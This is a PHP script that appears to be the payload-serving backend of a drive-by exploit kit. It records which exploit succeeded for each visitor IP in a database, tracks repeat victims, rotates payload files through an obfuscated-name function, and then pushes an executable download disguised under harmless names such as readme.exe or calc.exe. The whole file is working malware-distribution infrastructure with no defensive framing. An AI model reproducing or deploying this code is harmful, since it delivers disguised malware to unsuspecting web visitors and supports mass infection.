<?php 
include_once("./config.php");
if( isset($_GET["f"]) && isset($_SERVER["REMOTE_ADDR"]) && file_exists("./" . Config::get("FilesDir", "files") . "/" . intval($_GET["f"])) ) 
{
    if( !isset($_GET["e"]) ) 
    {
        $_GET["e"] = 4;
    }

    if( !@mysql_connect(@Config::get("MysqlHost"), @Config::get("MysqlUsername"), @Config::get("MysqlPassword")) ) 
    {
        throw new exception(mysql_error());
    }

    if( !@mysql_select_db(@Config::get("MysqlDatabase")) ) 
    {
        throw new exception("unable to select database");
    }

    mysql_query("UPDATE Logs SET ExploitID=" . intval($_GET["e"]) . ", FileID=" . intval($_GET["f"]) . ", IPStatus=1 WHERE (IP = inet_aton('" . $_SERVER["REMOTE_ADDR"] . "')) and (Redirect=0) and (IPStatus=0) order by DateTime desc limit 1");
    if( mysql_affected_rows() == 0 ) 
    {
        exit();
    }

    $r = mysql_query("select count(*) as cnt from Logs where (IP = inet_aton('" . $_SERVER["REMOTE_ADDR"] . "')) and (IPStatus=1) and (Redirect=0)");
    $rr = mysql_fetch_array($r);
    $dublicate = 2 <= $rr["cnt"];
    $arr = array( "readme", "info", "contacts", "about", "calc" );
    $filename = $arr[rand() % count($arr)] . ".exe";
    header("Pragma: public");
    header("Expires: " . gmdate("D, d M Y H:i:s") . " GMT");
    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
    header("Cache-Control: private", false);
    header("Content-Type: application/x-msdownload");
    header("Content-Disposition: attachment; filename=\"" . $filename . "\"");
    header("Content-Transfer-Encoding: binary");
    header("Content-Length: " . filesize("./" . Config::get("FilesDir", "files") . "/" . intval($_GET["f"])));
    if( !$dublicate ) 
    {
        _obfuscated_0D290C16300D0F3B332B1E04050B2F1914272224331622_(intval($_GET["f"]));
    }

    @readfile("./" . @Config::get("FilesDir", "files") . "/" . @intval($_GET["f"]));
    exit();
}

function _obfuscated_0D290C16300D0F3B332B1E04050B2F1914272224331622_($fileID)
{
    $path = Config::get("FilesDir") . "/dir" . $fileID . "/";
    $fileName = findfile($fileID);
    if( $fileName != 0 ) 
    {
        rename($path . $fileName, $path . ($fileName - 1));
    }

}

function findfile($fileID)
{
    $file = ".";
    if( $handle = opendir(Config::get("FilesDir") . "/dir" . $fileID) ) 
    {
        while( $file == "." || $file == ".." || $file == "index.php" ) 
        {
            $file = readdir($handle);
        }
        return $file;
    }

    return null;
}


